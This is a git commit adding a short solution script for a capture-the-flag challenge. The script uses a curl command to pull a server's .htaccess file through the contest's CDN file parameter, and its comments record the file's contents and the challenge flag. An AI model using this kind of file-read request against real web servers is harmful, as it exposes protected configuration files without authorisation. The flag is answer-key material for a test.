5bd6a10e5c86628ffe053911cc2cbb33136feeae
Danny Qiu <dqiu55@gmail.com>
2015-04-20 16:35:01 -0400

    Add solution for Secret Challenge

---
+++ Secret-Challenge_150-WITHHELD/solution.sh
@@ -0,0 +1,6 @@
+# Since their cdn is used to get the files for all the other problems, why don't we get the file for the hypertext access?
+
+curl cdn.camsctf.com/\?f=.htaccess 
+
+# Deny from all
+# {N0W_we_n33d_directory_traversal}
